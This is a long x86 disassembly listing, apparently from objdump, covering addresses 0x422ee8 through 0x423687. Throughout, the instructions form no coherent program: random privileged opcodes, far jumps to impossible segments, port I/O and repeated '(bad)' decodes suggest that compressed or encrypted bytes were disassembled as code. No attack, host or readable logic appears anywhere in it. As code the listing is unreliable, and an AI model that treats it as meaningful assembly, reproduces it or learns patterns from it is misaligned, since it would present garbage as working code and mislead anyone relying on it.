  422ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ee9:	sub    BYTE PTR [eax+eiz*1-0x53212eb0],0x40
  422ef1:	leave  
  422ef2:	mov    bh,0x67
  422ef4:	mov    eax,0xd08927b4
  422ef9:	pop    eax
  422efa:	rcr    BYTE PTR [edx-0x6f],1
  422efd:	cdq    
  422efe:	dec    edx
  422eff:	mov    ebp,0x258d0a8d
  422f04:	mov    bl,0x12
  422f06:	test   al,0xe4
  422f08:	inc    ecx
  422f09:	addr16 retf 0x77ee
  422f0d:	call   DWORD PTR [eax+0x2f]
  422f10:	fisubr WORD PTR [eax+0x62]
  422f13:	sbb    bl,dl
  422f15:	cmp    al,0xde
  422f17:	sar    BYTE PTR [ecx-0x2a],0x98
  422f1b:	pop    ebx
  422f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f1d:	je     0x422f33
  422f1f:	mov    dl,0x57
  422f21:	or     eax,0xffdfbd94
  422f26:	cmp    dh,BYTE PTR [edi+0x467c8f83]
  422f2c:	addr16 jne 0x422f27
  422f2f:	out    0x14,eax
  422f31:	int    0xab
  422f33:	cmp    dh,BYTE PTR [ebx]
  422f35:	ficomp WORD PTR [edx]
  422f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f38:	jb     0x422ed4
  422f3a:	mov    BYTE PTR [ebp+0x46e9f522],ah
  422f40:	jno    0x422f7a
  422f42:	daa    
  422f43:	mov    al,0x81
  422f45:	push   esp
  422f46:	sub    DWORD PTR [ebp+0x5d],esi
  422f49:	add    edi,ebx
  422f4b:	in     al,dx
  422f4c:	push   cs
  422f4d:	out    dx,eax
  422f4e:	xchg   ebx,eax
  422f4f:	xor    BYTE PTR ss:[esi-0x1d],0x60
  422f54:	into   
  422f55:	or     DWORD PTR [eax+0xd],0xffffffcb
  422f59:	fnstenv [eax*1+0x4708feca]
  422f60:	or     ecx,0x3a
  422f63:	mov    dl,0x77
  422f65:	and    al,0x58
  422f67:	cmp    eax,0x536493df
  422f6c:	push   edi
  422f6d:	dec    eax
  422f6e:	das    
  422f6f:	mov    cl,0x37
  422f71:	das    
  422f72:	repz xor edx,edx
  422f75:	enter  0x63de,0xe4
  422f79:	sub    eax,ebx
  422f7b:	jecxz  0x422f24
  422f7d:	cwde   
  422f7e:	leave  
  422f7f:	push   es
  422f80:	enter  0x298f,0xea
  422f84:	inc    ecx
  422f85:	mov    dl,0xc8
  422f87:	clc    
  422f88:	das    
  422f89:	enter  0xcb53,0xfa
  422f8d:	jmp    0xc48f:0x672b6b8a
  422f94:	rcr    BYTE PTR [edx],1
  422f96:	imul   ebp,DWORD PTR [edx+esi*8+0x278a941b],0xfe4d67ce
  422fa1:	xchg   ebx,eax
  422fa2:	enter  0x4cee,0x48
  422fa6:	add    BYTE PTR [ebx+0x1b41f040],dh
  422fac:	aam    0xcc
  422fae:	inc    eax
  422faf:	jmp    0x42301c
  422fb1:	mov    edx,0x47a9f1d
  422fb6:	test   al,0x7f
  422fb8:	jp     0x422ffb
  422fba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbb:	dec    edi
  422fbc:	adc    BYTE PTR [esi],cl
  422fbe:	popa   
  422fbf:	shl    bh,cl
  422fc1:	ins    BYTE PTR es:[edi],dx
  422fc2:	xchg   esp,eax
  422fc3:	and    edx,DWORD PTR [eax-0x45]
  422fc6:	xchg   DWORD PTR [ebp-0x3255b6d6],edx
  422fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fcd:	pop    esi
  422fce:	pop    edi
  422fcf:	xchg   BYTE PTR [esi-0x31],al
  422fd2:	jge    0x423014
  422fd4:	jmp    0xcbd:0xde2458b4
  422fdb:	jmp    FWORD PTR [ebx]
  422fdd:	addr16 or al,0x86
  422fe1:	mul    eax
  422fe3:	icebp  
  422fe4:	sti    
  422fe5:	fsubr  QWORD PTR [ebx-0x7]
  422fe8:	add    BYTE PTR [eax],al
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x42303a
  422ff7:	int    0x58
  422ff9:	das    
  422ffa:	mov    WORD PTR [esi+0x6860001],?
  423000:	add    BYTE PTR [eax],al
  423002:	js     0x422ff7
  423004:	adc    eax,DWORD PTR [edi]
  423006:	push   0x5
  423008:	sub    edx,DWORD PTR ds:0xcbdf9b8
  42300e:	out    0x7e,al
  423010:	dec    edx
  423011:	jb     0x42300c
  423013:	jb     0x423000
  423015:	test   BYTE PTR [eax],bh
  423017:	icebp  
  423018:	mov    ah,0x98
  42301a:	push   ecx
  42301b:	int3   
  42301c:	(bad)  
  42301d:	stos   BYTE PTR es:[edi],al
  42301e:	sbb    edi,DWORD PTR [ebx-0xc]
  423021:	pop    ecx
  423022:	outs   dx,BYTE PTR ds:[esi]
  423023:	push   ecx
  423024:	shl    DWORD PTR [edx-0x6],cl
  423027:	xchg   esi,eax
  423028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423029:	daa    
  42302a:	pop    edi
  42302b:	fs pop edi
  42302d:	std    
  42302e:	mov    eax,0x46f35dd0
  423033:	push   es
  423034:	jp     0x423084
  423036:	mov    edi,0xbfff39a1
  42303b:	inc    esi
  42303c:	repz jg 0x422fed
  42303f:	retfw  0xc724
  423043:	push   0x7d
  423045:	scas   al,BYTE PTR es:[edi]
  423046:	test   al,0xd3
  423048:	sbb    DWORD PTR [eax-0x3b74ba69],eax
  42304e:	imul   esi,DWORD PTR [ebp-0x104e9ba2],0x54
  423055:	push   0x5014d4b4
  42305a:	gs dec ebp
  42305c:	pop    ebx
  42305d:	xchg   edi,eax
  42305e:	pop    edx
  42305f:	scas   al,BYTE PTR es:[edi]
  423060:	jae    0x42307c
  423062:	xor    ebx,esi
  423064:	sbb    eax,0xffffffc7
  423067:	daa    
  423068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423069:	rcr    edi,1
  42306b:	imul   eax,DWORD PTR [edi-0x7430c7b3],0x7d
  423072:	(bad)  
  423073:	ins    DWORD PTR es:[edi],dx
  423074:	mov    cl,0xc6
  423076:	popw   ss
  423078:	and    eax,0xef065e0a
  42307d:	aam    0xe1
  42307f:	mov    ah,0xac
  423081:	lahf   
  423082:	js     0x423101
  423084:	and    dh,0x92
  423087:	std    
  423088:	push   edx
  423089:	scas   al,BYTE PTR es:[edi]
  42308a:	std    
  42308b:	pop    esi
  42308c:	push   esi
  42308d:	mov    ebp,0xe33d123b
  423092:	xchg   esi,eax
  423093:	fldcw  WORD PTR [eax-0x43]
  423096:	loop   0x42306b
  423098:	mov    ds:0x6d77bb15,al
  42309d:	mov    esi,0x15654745
  4230a2:	popa   
  4230a3:	arpl   cx,bx
  4230a5:	imul   ecx,DWORD PTR [edx+0x215b3405],0xe2d125e7
  4230af:	test   bl,dh
  4230b1:	jo     0x423108
  4230b3:	adc    eax,0xd2b35647
  4230b8:	gs inc esp
  4230ba:	repz pop edi
  4230bc:	inc    esp
  4230bd:	cmp    al,0x97
  4230bf:	xchg   DWORD PTR [eax+0x60],ebx
  4230c2:	ss daa 
  4230c4:	inc    edi
  4230c5:	outs   dx,DWORD PTR ds:[esi]
  4230c6:	lahf   
  4230c7:	adc    esi,DWORD PTR [eax+0xa]
  4230ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230cb:	inc    ebx
  4230cc:	sbb    ecx,ecx
  4230ce:	aam    0xbc
  4230d0:	leave  
  4230d1:	mov    WORD PTR [eax-0x1d],ss
  4230d4:	mov    eax,0xa61745f0
  4230d9:	pop    edi
  4230da:	mov    ecx,0x947112be
  4230df:	push   edx
  4230e0:	xlat   BYTE PTR ds:[ebx]
  4230e1:	dec    edi
  4230e2:	push   ecx
  4230e3:	cld    
  4230e4:	push   0x1745796b
  4230e9:	imul   ecx,esi,0x7c
  4230ec:	test   DWORD PTR [esi+0x6742c851],ebp
  4230f2:	push   0xdb061263
  4230f7:	test   al,0x56
  4230f9:	sahf   
  4230fa:	shl    BYTE PTR [esi],1
  4230fc:	pop    DWORD PTR [ebp-0xe]
  4230ff:	mov    al,0xec
  423101:	sub    al,0x11
  423103:	cmp    DWORD PTR [esi],ecx
  423105:	lahf   
  423106:	xor    eax,0xd8b47d75
  42310b:	mov    al,0xe6
  42310d:	shl    al,1
  42310f:	dec    ebp
  423110:	(bad)  
  423111:	hlt    
  423112:	sub    DWORD PTR [edi+0x6bfb71fb],ebp
  423118:	retf   0x8f81
  42311b:	arpl   WORD PTR [ebp+0x49c19645],di
  423121:	test   DWORD PTR ds:0x25d4364b,0x7e50e507
  42312b:	push   di
  42312d:	and    ebx,DWORD PTR [eax+0x29]
  423130:	fimul  WORD PTR [edi+0x4a381d2e]
  423136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423137:	or     edi,ebp
  423139:	hlt    
  42313a:	mov    dh,0x59
  42313c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42313d:	inc    ebx
  42313e:	mov    esp,0x70b1f150
  423143:	retf   
  423144:	push   ebp
  423145:	pop    es
  423146:	imul   ebp,DWORD PTR [ecx+edx*8],0x5b29f935
  42314d:	jecxz  0x423120
  42314f:	cld    
  423150:	xchg   edi,eax
  423151:	add    BYTE PTR [ecx+0x9],bl
  423154:	fcmovnbe st,st(1)
  423156:	sbb    edx,DWORD PTR [ebx]
  423158:	dec    esp
  423159:	retf   
  42315a:	test   DWORD PTR [edx-0x47eb7811],ebp
  423160:	xor    al,0x8d
  423162:	mov    cl,0xc0
  423164:	cmp    al,0xf7
  423166:	mov    ch,0x58
  423168:	mov    ebx,0xb1d7e2c3
  42316d:	cli    
  42316e:	push   ebp
  42316f:	loopne 0x4231b2
  423171:	xor    BYTE PTR [eax+0x2701ec4c],0xbf
  423178:	shl    edi,1
  42317a:	dec    edi
  42317b:	and    BYTE PTR [eax-0x5ad3b0d3],cl
  423181:	xchg   edx,eax
  423182:	jge    0x4231e2
  423184:	daa    
  423185:	lods   al,BYTE PTR ds:[esi]
  423186:	and    BYTE PTR [esi+0x5c],al
  423189:	bound  ebp,QWORD PTR [edi-0x73]
  42318c:	clc    
  42318d:	mov    bl,0x9c
  42318f:	aaa    
  423190:	das    
  423191:	lds    eax,FWORD PTR [esi-0x6ae80fe6]
  423197:	test   al,0x5c
  423199:	int    0xdc
  42319b:	mov    ch,0xdb
  42319d:	ins    DWORD PTR es:[edi],dx
  42319e:	adc    al,0xff
  4231a0:	ds xchg edx,eax
  4231a2:	xchg   ebp,eax
  4231a3:	pop    es
  4231a4:	pop    ebp
  4231a5:	mov    esi,0xc99713d4
  4231aa:	push   eax
  4231ab:	mov    eax,ss
  4231ad:	mov    al,0xb7
  4231af:	adc    al,0x7
  4231b1:	mov    eax,ds:0x550ca2fe
  4231b6:	inc    ebx
  4231b7:	shl    DWORD PTR [esi],cl
  4231b9:	push   ebp
  4231ba:	mov    eax,ds:0xdcc51900
  4231bf:	call   0x2067:0xffc21c03
  4231c6:	int    0x37
  4231c8:	outs   dx,BYTE PTR ds:[esi]
  4231c9:	fwait
  4231ca:	cmp    DWORD PTR [esi-0x55],eax
  4231cd:	and    BYTE PTR [ebx+0x58a5ddff],0x27
  4231d4:	mov    ch,0x4a
  4231d6:	adc    ah,BYTE PTR [esi-0x32ead447]
  4231dc:	in     al,0x4e
  4231de:	jb     0x4231d9
  4231e0:	mov    ds:0x9e2c419d,al
  4231e5:	xchg   ebx,eax
  4231e6:	push   cs
  4231e7:	icebp  
  4231e8:	jne    0x423213
  4231ea:	jnp    0x423223
  4231ec:	inc    ebp
  4231ed:	fbld   TBYTE PTR [ecx-0x6b]
  4231f0:	or     dh,BYTE PTR [edi+ecx*1-0x15]
  4231f4:	das    
  4231f5:	xchg   esi,eax
  4231f6:	in     eax,0x48
  4231f8:	rcr    DWORD PTR [eax+ecx*1+0x5c],1
  4231fc:	or     cx,si
  4231ff:	xchg   esp,eax
  423200:	sbb    ah,BYTE PTR [esi+0x3f7b2fa3]
  423206:	cmp    eax,0x93842001
  42320b:	add    bh,BYTE PTR [ebx-0x6f872cc8]
  423211:	out    dx,eax
  423212:	jne    0x42322d
  423214:	mov    esi,0x73b79b9c
  423219:	daa    
  42321a:	test   eax,0x1ad9c05b
  42321f:	mov    ebx,0x12221fba
  423224:	sub    DWORD PTR [ebx+0x30],eax
  423227:	push   esp
  423228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423229:	lahf   
  42322a:	inc    ebx
  42322b:	imul   edx,DWORD PTR [eax+0x1f23f6f],0xb25278cd
  423235:	mov    DWORD PTR [ecx-0x7a],0xf5d7707f
  42323c:	test   eax,0x9a318481
  423241:	push   ebp
  423242:	adc    ah,0x5f
  423245:	cli    
  423246:	mov    bh,0x47
  423248:	mov    edi,DWORD PTR [ebp+0xc]
  42324b:	cs scas eax,DWORD PTR es:[edi]
  42324d:	shr    DWORD PTR [edx+0x17],cl
  423250:	in     eax,0x8a
  423252:	in     al,dx
  423253:	(bad)  
  423254:	lds    ebp,FWORD PTR [edx+edi*1+0x50]
  423258:	fisttp QWORD PTR gs:[edi]
  42325b:	(bad)
  42325f:	pop    ds
  423260:	adc    al,0x80
  423262:	mov    ebx,0x4bdb095f
  423267:	out    dx,al
  423268:	xor    esi,DWORD PTR [eax+eax*8-0x778e7be9]
  42326f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423270:	add    eax,0x15a864b3
  423275:	out    dx,eax
  423276:	int3   
  423277:	adc    ebx,DWORD PTR [eax]
  423279:	lods   al,BYTE PTR ds:[esi]
  42327a:	mov    eax,0x74fcee5b
  42327f:	arpl   WORD PTR [eax],cx
  423281:	fwait
  423282:	mov    ebp,0x7e39add6
  423287:	mov    esi,0x7d9a6569
  42328c:	or     BYTE PTR [eax],dl
  42328e:	and    BYTE PTR [bp+si],0x7d
  423292:	cwde   
  423293:	stos   DWORD PTR es:[edi],eax
  423294:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  423296:	stos   DWORD PTR es:[edi],eax
  423297:	adc    BYTE PTR [edx],dl
  423299:	int    0x78
  42329b:	repz into 
  42329d:	dec    ebp
  42329e:	gs inc esp
  4232a0:	stos   BYTE PTR es:[edi],al
  4232a1:	xor    al,0x9f
  4232a3:	xor    DWORD PTR [esi],0xffffff83
  4232a6:	or     cl,dh
  4232a8:	(bad)  
  4232a9:	jecxz  0x423293
  4232ab:	cld    
  4232ac:	xchg   ebx,eax
  4232ad:	mov    ds:0x11ba976e,al
  4232b2:	les    esi,FWORD PTR [eax]
  4232b4:	cwde   
  4232b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232b6:	in     al,dx
  4232b7:	pop    ds
  4232b8:	pop    ebp
  4232b9:	shl    DWORD PTR [ebx+0x3d5e2ada],1
  4232bf:	mov    esi,0x519b079d
  4232c4:	lods   eax,DWORD PTR ds:[esi]
  4232c5:	test   al,0x17
  4232c7:	or     edi,esi
  4232c9:	call   0xe447220c
  4232ce:	ss ds pusha 
  4232d1:	cmp    ch,BYTE PTR [eax]
  4232d3:	jl     0x4232f8
  4232d5:	pop    esi
  4232d6:	je     0x42330d
  4232d8:	cmp    DWORD PTR [edi+0x15],edx
  4232db:	xchg   esi,eax
  4232dc:	add    DWORD PTR [edx+0x70],0x2f929718
  4232e3:	fcom   QWORD PTR [esi+0x24]
  4232e6:	test   BYTE PTR [ecx+0x3c],ch
  4232e9:	and    eax,0x716236f
  4232ee:	push   es
  4232ef:	sbb    bl,cl
  4232f1:	push   ds
  4232f2:	sub    al,0xb
  4232f4:	jg     0x4232ff
  4232f6:	je     0x423369
  4232f8:	xchg   esp,eax
  4232f9:	js     0x42329c
  4232fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232fc:	inc    esi
  4232fd:	dec    ebp
  4232fe:	dec    ecx
  4232ff:	push   ebx
  423300:	test   DWORD PTR [ebp-0x7bad8864],ebp
  423306:	add    eax,DWORD PTR [edi-0x716d643c]
  42330c:	pop    esp
  42330d:	mov    cr6,eax
  423310:	or     eax,0xa1d1fb70
  423315:	inc    edi
  423316:	mov    eax,DWORD PTR [esi]
  423318:	pushf  
  423319:	cmp    edi,DWORD PTR [esi+0x7bb4b776]
  42331f:	lods   eax,DWORD PTR ds:[esi]
  423320:	sbb    dh,al
  423322:	pop    es
  423323:	xchg   esp,eax
  423324:	add    DWORD PTR [ecx],ebx
  423326:	sar    bl,0x67
  423329:	push   ss
  42332a:	pop    ds
  42332b:	rcl    BYTE PTR [ecx],cl
  42332d:	mov    ecx,DWORD PTR ds:[ebp+0x72]
  423331:	mov    ebp,0x88bb6350
  423336:	sbb    eax,0x85cb3725
  42333b:	es xchg ebx,eax
  42333d:	loop   0x423334
  42333f:	ss dec edx
  423341:	xchg   esi,eax
  423342:	cmp    eax,0x8ca361b0
  423347:	mov    WORD PTR [ecx],es
  423349:	xchg   edx,eax
  42334a:	pop    ds
  42334b:	arpl   WORD PTR [edi-0x6b7efdf4],bx
  423351:	sbb    eax,0xab6217c3
  423356:	pop    ecx
  423357:	je     0x423391
  423359:	jnp    0x4233b9
  42335b:	clc    
  42335c:	retf   
  42335d:	scas   al,BYTE PTR es:[edi]
  42335e:	pop    eax
  42335f:	or     BYTE PTR [edi+0x4a],bl
  423362:	jg     0x42332c
  423364:	sbb    BYTE PTR [edx+eax*4],ch
  423367:	stos   BYTE PTR es:[edi],al
  423368:	cmp    BYTE PTR [ebp-0x2],ah
  42336b:	ins    BYTE PTR es:[edi],dx
  42336c:	call   0xa6fb62da
  423371:	mov    DWORD PTR [esi+0x36aaf1ec],ebx
  423377:	and    dl,cl
  423379:	fbld   TBYTE PTR [edx+0x51656938]
  42337f:	cmp    DWORD PTR [ebp+0x26],ebp
  423382:	into   
  423383:	loop   0x4233e1
  423385:	repnz call 0x5419:0xb651dcc4
  42338d:	mov    al,0x7a
  42338f:	retf   0x757d
  423392:	rcl    DWORD PTR ds:[eax+0x4bdd00fe],cl
  423399:	gs dec esp
  42339b:	sbb    al,ah
  42339d:	jmp    0x551c0d4
  4233a2:	and    dl,BYTE PTR [edx+0x7d661ac9]
  4233a8:	cmp    DWORD PTR [edi],esi
  4233aa:	sbb    DWORD PTR [edi+0x64dbaa34],ebx
  4233b0:	data16 into 
  4233b2:	jbe    0x423360
  4233b4:	(bad)
  4233b8:	hlt    
  4233b9:	mov    cl,0xb0
  4233bb:	popa   
  4233bc:	mov    ecx,0xe468917b
  4233c1:	dec    ebx
  4233c2:	clc    
  4233c3:	adc    al,0xa9
  4233c5:	pop    esi
  4233c6:	ret    
  4233c7:	rcl    BYTE PTR [ecx-0x3a],cl
  4233ca:	dec    eax
  4233cb:	jmp    0x4233a2
  4233cd:	sub    edx,DWORD PTR [eax-0x7d004022]
  4233d3:	out    0x3f,eax
  4233d5:	mov    eax,0x35e26e7
  4233da:	loop   0x423381
  4233dc:	push   0x3c
  4233de:	test   eax,0x8d6c445a
  4233e3:	pusha  
  4233e4:	adc    esp,DWORD PTR [ebx]
  4233e6:	frstor [edx+0x558347c4]
  4233ec:	ins    DWORD PTR es:[edi],dx
  4233ed:	das    
  4233ee:	or     al,0x79
  4233f0:	inc    eax
  4233f1:	in     al,0xc5
  4233f3:	mov    al,0x8f
  4233f5:	hlt    
  4233f6:	cdq    
  4233f7:	adc    ebp,ecx
  4233f9:	fsubrp st(3),st
  4233fb:	mov    al,0x4
  4233fd:	xlat   BYTE PTR ds:[ebx]
  4233fe:	adc    esp,esi
  423400:	cdq    
  423401:	and    DWORD PTR [ebp-0x26],edx
  423404:	dec    edx
  423405:	pop    eax
  423406:	bound  eax,QWORD PTR [eax-0xf]
  423409:	gs pop ds
  42340b:	mov    dl,0x69
  42340d:	push   edx
  42340e:	sbb    edi,0x56aa3e2d
  423414:	div    ebp
  423416:	sub    ebp,edi
  423418:	push   cs
  423419:	add    BYTE PTR [ebp-0x1b],al
  42341c:	mov    dl,0x52
  42341e:	lahf   
  42341f:	xor    al,0x25
  423421:	inc    esp
  423422:	and    bh,ah
  423424:	add    esp,DWORD PTR [eax]
  423426:	loope  0x42348f
  423428:	aas    
  423429:	inc    edx
  42342a:	or     al,0x7e
  42342c:	sub    DWORD PTR [edx-0x7b4cdae4],edx
  423432:	and    DWORD PTR [ecx-0x68116992],0xffffffb4
  423439:	or     al,0xdc
  42343b:	lock daa 
  42343d:	push   es
  42343e:	ror    BYTE PTR [edi-0x5b],cl
  423441:	(bad)  
  423442:	stc    
  423443:	in     al,0xe5
  423445:	lds    ebx,FWORD PTR [esi]
  423447:	ret    
  423448:	adc    ebp,ecx
  42344a:	or     bl,BYTE PTR [ecx+ebx*4]
  42344d:	das    
  42344e:	rcr    DWORD PTR [ebx+0x46289514],0xa4
  423455:	das    
  423456:	dec    edx
  423457:	mov    ebp,edi
  423459:	xor    eax,0x10358cdf
  42345e:	cs out dx,al
  423460:	jmp    0x4c672657
  423465:	fnstcw WORD PTR [ebp+edi*4-0x14]
  423469:	or     eax,esi
  42346b:	imul   ecx,DWORD PTR [ebx+0x25],0xffffffc5
  42346f:	or     ch,BYTE PTR ds:0x7e9af5ba
  423475:	mov    ebp,0xcdb50f98
  42347a:	sbb    eax,0xbda15b49
  42347f:	add    edx,eax
  423481:	xchg   edi,eax
  423482:	imul   ebp,eax,0x737c8d2d
  423488:	push   edx
  423489:	icebp  
  42348a:	fstp   QWORD PTR [ecx+0x48]
  42348d:	jbe    0x423421
  42348f:	test   al,0xb2
  423491:	mov    eax,ds:0xf94c502e
  423496:	sub    DWORD PTR [eax],edi
  423498:	scas   eax,DWORD PTR es:[edi]
  423499:	das    
  42349a:	cld    
  42349b:	retf   
  42349c:	xchg   edx,eax
  42349d:	stc    
  42349e:	mov    esi,eax
  4234a0:	test   eax,0xd61949b8
  4234a5:	pop    ebx
  4234a6:	jmp    0x42345b
  4234a8:	js     0x4234cb
  4234aa:	xchg   ebx,eax
  4234ab:	pop    esi
  4234ac:	or     DWORD PTR [ecx-0x3ddb6bdb],esi
  4234b2:	out    dx,al
  4234b3:	in     al,dx
  4234b4:	push   ebp
  4234b5:	xchg   edx,esi
  4234b7:	pop    ss
  4234b8:	adc    DWORD PTR [ebx],ebp
  4234ba:	jecxz  0x4234cc
  4234bc:	push   0x234cb686
  4234c1:	xchg   ebp,eax
  4234c2:	cmp    eax,0xffd88930
  4234c7:	inc    ebp
  4234c8:	lods   al,BYTE PTR ds:[esi]
  4234c9:	sahf   
  4234ca:	xchg   DWORD PTR [eax],ebp
  4234cc:	loopne 0x4234db
  4234ce:	and    esi,DWORD PTR [edi]
  4234d0:	test   eax,0xb3a11974
  4234d5:	adc    eax,0x85b1ba11
  4234da:	sub    edx,DWORD PTR [ecx+edi*8+0x6807620b]
  4234e1:	test   BYTE PTR [eax+0x22b12c9d],dh
  4234e7:	lahf   
  4234e8:	xchg   esi,eax
  4234e9:	mov    al,0xfa
  4234eb:	les    eax,FWORD PTR [esi+0xa]
  4234ee:	stos   BYTE PTR es:[edi],al
  4234ef:	lahf   
  4234f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234f1:	pushf  
  4234f2:	add    DWORD PTR [ebp+0x5b],ebp
  4234f5:	mov    ah,0x38
  4234f7:	pop    ds
  4234f8:	into   
  4234f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234fa:	adc    al,0x12
  4234fc:	retf   0xd3c8
  4234ff:	fild   DWORD PTR [edx]
  423501:	div    ecx
  423503:	pop    ss
  423504:	jp     0x42351c
  423506:	pop    eax
  423507:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423508:	inc    edi
  423509:	test   al,0x5c
  42350b:	in     eax,0xe1
  42350d:	xor    edi,DWORD PTR [esi-0x1ddd3149]
  423513:	test   al,0x1f
  423515:	cld    
  423516:	je     0x42354b
  423518:	mov    ?,WORD PTR [ebp-0x2887b050]
  42351e:	push   ecx
  42351f:	jno    0x42358d
  423521:	inc    ebx
  423522:	mov    esp,0xf3ad68b6
  423527:	dec    BYTE PTR [edi+ebp*8-0xc4cf051]
  42352e:	fnstsw WORD PTR [esi-0x7b]
  423531:	je     0x4234cf
  423533:	hlt    
  423534:	push   0x70
  423536:	inc    eax
  423537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423538:	cmp    edi,DWORD PTR [ebx]
  42353a:	retf   
  42353b:	push   ds
  42353c:	sbb    edx,ebx
  42353e:	jp     0x423594
  423540:	xor    edx,DWORD PTR [edx-0x77198d03]
  423546:	ds stc 
  423548:	or     BYTE PTR [ebx-0x43],cl
  42354b:	cmp    BYTE PTR [ecx-0x66],dl
  42354e:	rol    BYTE PTR [esi-0x464bf9a7],0xd9
  423555:	pop    ss
  423556:	ins    DWORD PTR es:[edi],dx
  423557:	lea    eax,[edi-0x23]
  42355a:	cmp    bh,BYTE PTR [ebx]
  42355c:	(bad)  
  42355d:	shl    BYTE PTR [ebp+0x6cca6e70],1
  423563:	pusha  
  423564:	outs   dx,BYTE PTR ds:[esi]
  423565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423566:	fucomp st(4)
  423568:	popf   
  423569:	jg     0x4235e2
  42356b:	(bad)  
  42356c:	pushf  
  42356d:	enter  0xff0,0x37
  423571:	xchg   esp,eax
  423572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423573:	inc    ecx
  423574:	or     BYTE PTR [esi+0xa],al
  423577:	in     al,0x5
  423579:	lock (bad) 
  42357b:	(bad)  
  42357c:	jnp    0x42359a
  42357e:	mov    ebx,0x3170b7e4
  423583:	loope  0x423575
  423585:	scas   al,BYTE PTR es:[edi]
  423586:	nop
  423587:	mov    ebx,0xa738d329
  42358c:	adc    cl,BYTE PTR [ecx]
  42358e:	es ins BYTE PTR es:[edi],dx
  423590:	or     al,0x5d
  423592:	icebp  
  423593:	rcr    BYTE PTR [edx+0x6d],1
  423596:	add    bh,ch
  423598:	outs   dx,DWORD PTR ds:[esi]
  423599:	jmp    0x4235c5
  42359b:	sbb    al,0x90
  42359d:	les    ebx,FWORD PTR [esi]
  42359f:	xor    DWORD PTR [edi],esp
  4235a1:	icebp  
  4235a2:	cmp    eax,0xeaaf484d
  4235a7:	rol    BYTE PTR [eax],0xda
  4235aa:	or     DWORD PTR [esi+0xe573edd],edx
  4235b0:	adc    BYTE PTR [eax+edi*4+0x20414a0],0x51
  4235b8:	in     al,0xce
  4235ba:	push   0xffffff9d
  4235bc:	sar    eax,cl
  4235be:	or     eax,0xff3ae2fb
  4235c3:	call   0x38d3d440
  4235c8:	fld    TBYTE PTR [edx+0x75427cdc]
  4235ce:	jle    0x42357d
  4235d0:	inc    eax
  4235d1:	ins    BYTE PTR es:[edi],dx
  4235d2:	jb     0x423628
  4235d4:	adc    bl,bh
  4235d6:	and    ecx,0x13
  4235d9:	adc    al,0xe7
  4235db:	jae    0x4235b6
  4235dd:	cmp    ebx,DWORD PTR [ecx-0x26]
  4235e0:	retf   0x3dda
  4235e3:	pusha  
  4235e4:	in     eax,0xfb
  4235e6:	adc    eax,0xa9417e82
  4235eb:	bound  edx,QWORD PTR [ecx+0x30]
  4235ee:	ins    DWORD PTR es:[edi],dx
  4235ef:	push   ds
  4235f0:	mov    esp,0xa17fd053
  4235f5:	cmp    BYTE PTR [edx+0x3a],ah
  4235f8:	in     al,0x3d
  4235fa:	pop    esp
  4235fb:	pop    esp
  4235fc:	mov    edx,DWORD PTR [esi+0xa]
  4235ff:	fdivr  QWORD PTR [ebx]
  423601:	cs pop esp
  423603:	pop    esp
  423604:	aas    
  423605:	add    eax,0x7afa6be3
  42360a:	mov    ch,0x32
  42360c:	fucomp st(2)
  42360e:	(bad)  
  42360f:	fidiv  DWORD PTR [esi]
  423611:	rcr    BYTE PTR [edi],0xbd
  423614:	sbb    BYTE PTR [edi-0x64],0x8e
  423618:	test   al,al
  42361a:	adc    BYTE PTR ss:[edx],0x4d
  42361e:	rcl    DWORD PTR [ecx],1
  423620:	push   esi
  423621:	outs   dx,DWORD PTR ds:[esi]
  423622:	dec    edx
  423623:	scas   al,BYTE PTR es:[edi]
  423624:	push   es
  423625:	out    dx,al
  423626:	popf   
  423627:	(bad)  
  423629:	js     0x423653
  42362b:	sub    DWORD PTR [edi+0x29c9ec88],ecx
  423631:	ror    BYTE PTR [esi+0x5a],0x67
  423635:	xchg   ebp,eax
  423636:	sub    BYTE PTR [eax-0x1981a069],ch
  42363c:	push   es
  42363d:	xchg   edi,eax
  42363e:	mov    DWORD PTR [edi+0x1178ec3d],edi
  423644:	mov    al,ch
  423646:	adc    al,0xb
  423648:	stos   DWORD PTR es:[edi],eax
  423649:	push   edi
  42364a:	out    0xbf,al
  42364c:	add    edx,ecx
  42364e:	inc    ebp
  42364f:	mov    BYTE PTR es:[edx-0x6d],cl
  423653:	inc    ebp
  423654:	mov    ah,0xae
  423656:	loope  0x4236c9
  423658:	repnz and esp,DWORD PTR [eax]
  42365b:	jecxz  0x423608
  42365d:	pop    eax
  42365e:	lahf   
  42365f:	mov    eax,0x4de854f8
  423664:	mov    ecx,0xbcf6a
  423669:	mov    WORD PTR [edx+ecx*4],ss
  42366c:	fisttp QWORD PTR [edi]
  42366e:	(bad)  
  423670:	mov    cl,BYTE PTR [ecx]
  423672:	mov    ds:0xd6dbb241,al
  423677:	(bad)  [esi+ecx*4-0x51]
  42367b:	push   0x11e6424d
  423680:	sub    eax,0x82a6615d
  423685:	repnz into 
  423687:	sub    BYTE PTR [eax],al
